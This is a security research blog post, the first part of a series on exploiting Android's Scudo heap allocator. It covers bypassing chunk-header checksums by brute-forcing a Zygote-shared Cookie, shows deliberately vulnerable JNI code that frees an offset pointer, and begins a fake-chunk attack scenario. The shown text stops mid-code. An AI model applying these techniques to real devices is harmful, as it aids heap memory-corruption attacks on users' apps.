<!doctype html><html lang=en dir=ltr><head><title>Scudo, the Allocator (Part 1) :: lolcads tech blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free , although realloc and other functions may also be of interest. According to source code , the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.
"><meta name=keywords content="Android,Binary Exploitation,JNI,Scudo,Heap Exploitation"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2024/07/scudo_0/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="Scudo, the Allocator (Part 1)"><meta property="og:description" content="Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free , although realloc and other functions may also be of interest. According to source code , the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-25T16:46:21+01:00"><meta property="article:modified_time" content="2024-07-25T16:46:21+01:00"><meta property="article:tag" content="Android"><meta property="article:tag" content="Binary Exploitation"><meta property="article:tag" content="JNI"><meta property="article:tag" content="Scudo"><meta property="article:tag" content="Heap Exploitation"><meta name=twitter:card content="summary"><meta name=twitter:title content="Scudo, the Allocator (Part 1)"><meta name=twitter:description content="Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free , although realloc and other functions may also be of interest. According to source code , the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1."><link rel=canonical href=https://lolcads.github.io/posts/2024/07/scudo_0/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.08ae78ad799bdf6bc07f88b81fb42f6102cb7ef8c52893763bcc6ef38078b13f.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2024/07/scudo_0/></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2024/07/scudo_0/>Scudo, the Allocator (Part 1)</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/android/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Android</span></a></li><li><a href=/tags/binary-exploitation/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Binary Exploitation</span></a></li><li><a href=/tags/jni/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>JNI</span></a></li><li><a href=/tags/scudo/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Scudo</span></a></li><li><a href=/tags/heap-exploitation/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Heap Exploitation</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-07-25T16:46:21+01:00>2024-07-25</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>38 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Pascal KÃ¼hnemann</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#necessary-assumptions>Necessary Assumptions</a><ul><li><a href=#classical-information-leak>Classical Information Leak</a></li><li><a href=#unprivileged-app>Unprivileged App</a></li><li><a href=#suitable-jni-code>Suitable JNI Code</a></li></ul></li><li><a href=#attack-scenarios-on-scudo---related-vulnerabilities>Attack Scenarios on <em>Scudo</em> - related Vulnerabilities</a><ul><li><a href=#freeing-chunks-that-are-not-really-chunks>Freeing Chunks that are not really Chunks</a></li><li><a href=#heap---based-meta-data-overflow>Heap - based Meta Data Overflow</a></li></ul></li><li><a href=#future-work>Future Work</a></li><li><a href=#summary>Summary</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h1 id=binary-exploitation-for-scudo-heap-allocator-on-android>Binary Exploitation for <em>Scudo Heap Allocator</em> on Android</h1><p>In this series of blog posts, we will investigate how an attacker may leverage the internals of the <a href=https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/ target=_blank rel=noopener><em>Scudo Allocator</em></a>
in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57" target=_blank rel=noopener><code>malloc</code></a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35" target=_blank rel=noopener><code>free</code></a>
, although <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=122" target=_blank rel=noopener><code>realloc</code></a>
and other functions may also be of interest. According to <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d" target=_blank rel=noopener>source code</a>
, the Scudo version considered in this blog is <code>161cca266a9d0b6deb5f1fd2de8ad543649a7fa1</code>.</p><p>If you have no idea about the fundamentals of <em>Scudo</em>, try reading the linked code! The followup blog post discusses <em>timing side channel attacks</em> on Scudo and requires some of the basics discussed in this post.</p><h2 id=necessary-assumptions>Necessary Assumptions</h2><p>Up to this point, no &ldquo;easy&rdquo; way of bypassing the checks in the implementations of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=298;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>malloc</code></a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513" target=_blank rel=noopener><code>free</code></a>
has been found. Therefore it will be unavoidable to assume that certain events have happened already.</p><p>The key observation is that every <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=65" target=_blank rel=noopener>chunk header</a>
is protected by a checksum, which is verified for every chunk that is passed to <code>free</code> via <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=547;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Chunk::loadHeader(Cookie, Ptr, &amp;Header)</code></a>
. The computations performed when calculating the checksum are architecture - dependent. Therefore, we assume an Intel architecture, i.e. the checksum computation is based on the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=31;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>crc32</code></a>
instruction.</p><p>The checksum depends on</p><ol><li>a <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=988" target=_blank rel=noopener>random 32-bit value</a>
named <code>Cookie</code></li><li>a pointer to the user data. This pointer is pointing to the memory located right after the chunk header.</li><li>the header of the chunk. The checksum is computed over the header with a zeroed - out checksum field.</li></ol><p>Also, as <a href=https://link.springer.com/article/10.1007/s10207-018-00425-8 target=_blank rel=noopener><em>Zygote</em> forks itself</a>
when creating a new app, global variables of shared - object files that are already loaded into <em>Zygote</em> will remain constant until <em>Zygote</em> is restarted. A list of loaded shared - object files can be seen below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf -d /proc/<span class=k>$(</span>pidof zygote64<span class=k>)</span>/exe <span class=p>|</span> grep NEEDED
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libandroid_runtime.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libbinder.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libcutils.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libhidlbase.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>liblog.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libnativeloader.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libsigchain.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libutils.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libwilhelm.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libc++.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libc.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libm.so<span class=o>]</span>
</span></span><span class=line><span class=cl>    0x0000000000000001 <span class=o>(</span>NEEDED<span class=o>)</span>             Shared library: <span class=o>[</span>libdl.so<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /proc/<span class=k>$(</span>pidof zygote64<span class=k>)</span>/maps <span class=p>|</span> grep libc.so
</span></span><span class=line><span class=cl>730eb404b000-730eb408f000 r--p <span class=m>00000000</span> 07:60 <span class=m>21</span>    /apex/com.android.runtime/lib64/bionic/libc.so
</span></span><span class=line><span class=cl>730eb408f000-730eb411d000 r-xp <span class=m>00043000</span> 07:60 <span class=m>21</span>    /apex/com.android.runtime/lib64/bionic/libc.so
</span></span><span class=line><span class=cl>730eb411d000-730eb4122000 r--p 000d0000 07:60 <span class=m>21</span>    /apex/com.android.runtime/lib64/bionic/libc.so
</span></span><span class=line><span class=cl>730eb4122000-730eb4123000 rw-p 000d4000 07:60 <span class=m>21</span>    /apex/com.android.runtime/lib64/bionic/libc.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ readelf -s /apex/com.android.runtime/lib64/bionic/libc.so <span class=p>|</span> grep -e <span class=s2>&#34; scudo_malloc&#34;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>    199: 000000000004a0f0    <span class=m>55</span> FUNC    LOCAL  DEFAULT   <span class=m>14</span> scudo_malloc
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Thus, <em>Scudo</em> is implemented in <em>libc.so</em>. Therefore it can be expected that the global variable <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=23;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1" target=_blank rel=noopener><code>SCUDO_ALLOCATOR</code></a>
, which is used to implement <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=57" target=_blank rel=noopener><code>scudo_malloc</code></a>
and so on, is the same across all apps forked from <em>Zygote</em>. <code>SCUDO_ALLOCATOR</code> is nothing but an <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1" target=_blank rel=noopener>instance</a>
of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=46;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1" target=_blank rel=noopener><code>scudo::Allocator</code></a>
, which contains the field named <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=988;drc=b0193ccac5b8399f9b5ef270d102b5a50f9446ab;bpv=1;bpt=1" target=_blank rel=noopener><code>Cookie</code></a>
. Hence, the <code>Allocator::Cookie</code> field can be expected to be the same across all apps forked from <em>Zygote</em>.</p><p>So we need to get the cookie once (per system restart) and we will be able to exploit <em>Scudo</em>/Heap - related vulnerabilities as long as we know necessary pointers. Unless stated otherwise, in the following sections we will <strong>always</strong> assume that we are given sufficient leaks to compute correct checksums!</p><h3 id=classical-information-leak>Classical Information Leak</h3><p>Attacks on checksum computation are already out there, e.g. it <strong>has been</strong> possible to compute the <code>Cookie</code> from a pointer and header leak (the header contains a valid checksum!) by reformulating the checksum computation as a set of <a href=https://blog.infosectcbr.com.au/2020/04/breaking-secure-checksums-in-scudo_8.html target=_blank rel=noopener>SMT equations</a>
. Unfortunately, comparing the implementation attacked with the implementation we are facing, we can observe that</p><ol><li>Intel uses a custom generator polynomial to implement <code>crc32</code> (see Intel Manual Vol. 2). I.e. <code>poly = 0x11EDC6F41</code> instead of the standardized <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;ved=2ahUKEwjv-b6ek577AhUfgP0HHTfXDqYQFnoECA0QAQ&amp;url=https%3A%2F%2Fwww.xilinx.com%2Fsupport%2Fdocumentation%2Fapplication_notes%2Fxapp209.pdf&amp;usg=AOvVaw14GnRtGjY_V6hR_uKgWz03" target=_blank rel=noopener><code>0x0104C11DB7</code></a>
.</li><li>Checksum computation in our cases applies an <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/chunk.h;l=32;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>additional xor</a>
in order to reduce the checksum size.</li></ol><p>It has not been possible to derive a lookup table for Intel&rsquo;s crc32 implementation. If it had been successful, maybe the SMT attack would have worked. Other attacks involving symbolic execution (via <a href=http://klee.github.io/ target=_blank rel=noopener>klee</a>
based on <a href=https://sat-smt.codes/SAT_SMT_by_example.pdf target=_blank rel=noopener>this</a>
have also not been successful&mldr;). Still, there is another approach to go back to: <strong>brute - force</strong>!</p><p>Turns out that using a multi - threaded application to brute - force the <code>Cookie</code> overshot the goal. E.g., if we are given:</p><ol><li><code>pointer = 0x7bac6974fd30</code></li><li><code>header = 0x20d2000000010101</code></li></ol><p>brute - forcing the <code>Cookie</code> s.t. <code>computeChecksum(Cookie, pointer, zeroed_header) == checksum(header)</code> is true resulted in roughly 120155 candidates over the course of 3 seconds&mldr; running it for longer of course will yield more results:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ head cookies.txt
</span></span><span class=line><span class=cl>0x2a7e
</span></span><span class=line><span class=cl>0x2000539a
</span></span><span class=line><span class=cl>0x6000a052
</span></span><span class=line><span class=cl>0x4000d9b6
</span></span><span class=line><span class=cl>0x80009213
</span></span><span class=line><span class=cl>0xc00061db
</span></span><span class=line><span class=cl>0x20014924
</span></span><span class=line><span class=cl>0xe000183f
</span></span><span class=line><span class=cl>0x130c0
</span></span><span class=line><span class=cl>0xa000ebf7
</span></span></code></pre></div><p>Now one might argue that those cookie values are only valid for the above configuration. The funny thing is that at least some of them <strong>work for different configurations as well</strong>! This means that the pointer used to brute - force the cookie can be completely different from the pointer of our buffer! Of course neither every single value has been verified, nor is there a formal proof to why most of the above cookies work. Empirically speaking, e.g. <code>0x2a7e</code> worked for crafting fake chunks etc. therefore bypassing the checksum verifications!</p><h3 id=unprivileged-app>Unprivileged App</h3><p>Due to the appification, one might argue that it nowadays is easier to execute an app on a targeted mobile device (assuming your average smartphone user) than it has been 10 years ago. Therefore, research regarding <em>side channel attacks on mobile devices</em> (e.g. see &ldquo;An Insight into Android Side-Channel Attacks&rdquo; for a rough overview on this topic) often assume that there is an unprivileged app already running on the targeted device.</p><p>Hence we could also assume that we can at least start an app on the target device. Notice that permissions for <a href=https://developer.android.com/reference/android/Manifest.permission#INTERNET target=_blank rel=noopener>communication over the internet</a>
are <a href=https://developer.android.com/guide/topics/permissions/overview#normal target=_blank rel=noopener>normal permissions</a>
, i.e. they are specified in the android manifest file of an app and the user is only asked once per installation whether the permissions are fine or not. Therefore we may also assume that an app has almost arbitrary install - time permissions and can leak information via networking.</p><p>Adding to the pile, on Android every app is <a href=#necessary-assumptions>forked from a process named <code>Zygote64</code></a>
. Convince yourself that <code>libc.so</code></p><ol><li>contains <em>Scudo</em></li><li>is loaded by <code>Zygote64</code></li></ol><p>Finally, there is only <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c_bionic.cpp;l=27;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener>one instance of the allocator</a>
.</p><p>Concluding, every app not only has access to the canary used in every app, but also to the <code>Cookie</code> used in <strong>every app</strong>. Thus, an unprivileged app can easily leak the cookie, therefore leaving us with <em>almost</em> the same setting as the <a href=#classical-information-leak>information leak</a>
. The only difference is that we do not have a pointer, which we need to compute the checksum.</p><h3 id=suitable-jni-code>Suitable JNI Code</h3><p>As always, we will consider small example modules for <em>damnvulnerableapp</em>. These will not represent real - world applications, but rather contain obviously vulnerable code like <code>free(attacker_controlled_buffer + 0x10)</code>.</p><h2 id=attack-scenarios-on-scudo---related-vulnerabilities>Attack Scenarios on <em>Scudo</em> - related Vulnerabilities</h2><p>From this point onwards, we will try to derive attacks that are applicable to bugs that involve calls to <em>Scudo</em> - related functions like <code>free</code>. These attacks will be of the form <em>Proof of Concept</em>, i.e. e.g. we will already be satisfied, if construction of fake chunks works, instead of achieving arbitrary code execution. The idea here is to get to a comparable point wrt. other heap implementations like <a href=https://www.gnu.org/software/libc/manual/html_node/The-GNU-Allocator.html target=_blank rel=noopener><em>dlmalloc</em></a>
.</p><h3 id=freeing-chunks-that-are-not-really-chunks>Freeing Chunks that are not really Chunks</h3><p>For this section and following subsections we will assume that the target app contains JNI code similar to:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>buffer</span> <span class=o>+</span> <span class=n>x</span><span class=p>);</span> <span class=c1>// x = 0x10(primary) or 0x40(secondary)
</span></span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Disregarding the fact that no programmer would ever call <code>free</code> like this, there are always settings where the attention of a developer slips and comparable bugs occur. Also we could reinterpret this as calling <code>free</code> on an attacker - controlled pointer.</p><p>When calling <code>free</code>, internally <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/wrappers_c.inc;l=35" target=_blank rel=noopener><code>scudo_free</code></a>
is executed, which will wind up to call <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=513" target=_blank rel=noopener><code>deallocate</code></a>
. There are a few checks we need to pass in order to get to the storage parts of chunks of the allocator:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=c1>// [1] Check alignment of pointer provided to deallocate
</span></span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>UNLIKELY</span><span class=p>(</span><span class=o>!</span><span class=n>isAligned</span><span class=p>(</span><span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=n>uptr</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Ptr</span><span class=p>),</span> <span class=n>MinAlignment</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>reportMisalignedPointer</span><span class=p>(</span><span class=n>AllocatorAction</span><span class=o>::</span><span class=n>Deallocating</span><span class=p>,</span> <span class=n>Ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=c1>// [2] Check the checksum of the header. If it is corrupted, the process will be aborted!
</span></span></span><span class=line><span class=cl><span class=n>Chunk</span><span class=o>::</span><span class=n>loadHeader</span><span class=p>(</span><span class=n>Cookie</span><span class=p>,</span> <span class=n>Ptr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>Header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// [3] Verify that the chunk is not double - freed
</span></span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>UNLIKELY</span><span class=p>(</span><span class=n>Header</span><span class=p>.</span><span class=n>State</span> <span class=o>!=</span> <span class=n>Chunk</span><span class=o>::</span><span class=n>State</span><span class=o>::</span><span class=n>Allocated</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>reportInvalidChunkState</span><span class=p>(</span><span class=n>AllocatorAction</span><span class=o>::</span><span class=n>Deallocating</span><span class=p>,</span> <span class=n>Ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=c1>// [4] Check that e.g. free is used for malloc&#39;ed memory.
